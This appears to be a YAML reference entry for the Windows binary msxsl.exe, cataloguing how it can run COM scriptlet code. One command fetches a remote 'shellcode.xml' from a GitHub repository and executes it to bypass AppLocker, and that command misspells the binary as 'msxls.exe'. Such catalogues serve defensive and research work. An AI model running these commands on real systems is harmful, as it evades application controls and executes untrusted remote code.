---
name: msxsl.exe
description: 
functions:
  execute:
    - description: Run COM Scriptlet code within the script.xsl file (local).
      code: msxsl.exe customers.xml script.xsl
    - description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
      code: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
resources: 
    - resource: https://twitter.com/subTee/status/877616321747271680
    - resource: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
fullpath: 
    - path: Missing
notes: Thanks to Casey Smith - @subTee (Finding), 3gstudent - @3gstudent (Remote)
---